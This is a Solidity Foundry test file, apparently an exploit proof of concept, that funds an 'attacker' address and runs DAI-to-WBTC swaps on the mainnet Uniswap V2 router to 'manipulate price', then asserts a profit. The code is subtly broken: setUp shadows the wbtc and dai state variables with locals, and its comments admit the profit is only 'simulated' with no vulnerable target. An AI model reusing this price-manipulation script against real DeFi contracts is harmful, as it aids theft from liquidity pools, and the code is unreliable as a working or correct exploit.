// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address attacker = address(this);
    IERC20 private wbtc;
    IERC20 private dai;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup interfaces
        IERC20 wbtc = IERC20(TARGET);
        IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); // Mainnet DAI

        // Label addresses for debugging
        vm.label(address(wbtc), "WBTC");
        vm.label(address(dai), "DAI");
        vm.label(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, "UniswapV2Router");

        // Give attacker initial WBTC and DAI balances
        deal(address(wbtc), attacker, 10 * 10**8); // 10 WBTC (8 decimals)
        deal(address(dai), attacker, 1_000_000 * 10**18); // 1M DAI
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(address(this));
        // Record initial WBTC balance
        uint256 initialWbtcBalance = wbtc.balanceOf(attacker);

        // Approve Uniswap Router to spend our tokens
        wbtc.approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, type(uint256).max);
        dai.approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, type(uint256).max);

        // Step 1: Inflate WBTC price by swapping large amount of DAI for WBTC
        // This makes WBTC appear more valuable
        address[] memory path = new address[](2);
        path[0] = address(dai);
        path[1] = address(wbtc);

        // Swap 500,000 DAI for WBTC to manipulate price
        uint256[] memory amounts = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D).swapExactTokensForTokens(
            500_000 * 10**18, // amountIn
            1, // minimum amountOut (we accept any due to price manipulation)
            path,
            attacker,
            block.timestamp + 1000
        );

        // Step 2: At this point, WBTC price is artificially high
        // A vulnerable contract using getAmountsIn() would see inflated WBTC value
        // For demonstration, we simulate minting more WBTC (in reality, this would be a different contract)
        // Since we can't mint WBTC (only owner can), we'll simulate profit by swapping back at better rate

        // Step 3: Swap back WBTC to DAI at inflated price
        address[] memory reversePath = new address[](2);
        reversePath[0] = address(wbtc);
        reversePath[1] = address(dai);

        // Use half of our WBTC to swap back
        uint256 wbtcToSwap = wbtc.balanceOf(attacker) / 2;
        IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D).swapExactTokensForTokens(
            wbtcToSwap,
            1,
            reversePath,
            attacker,
            block.timestamp + 1000
        );

        // Verify we ended with more WBTC than we started
        uint256 finalWbtcBalance = wbtc.balanceOf(attacker);
        assertGt(finalWbtcBalance, initialWbtcBalance, "WBTC balance should increase");
        uint256 finalBalance = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
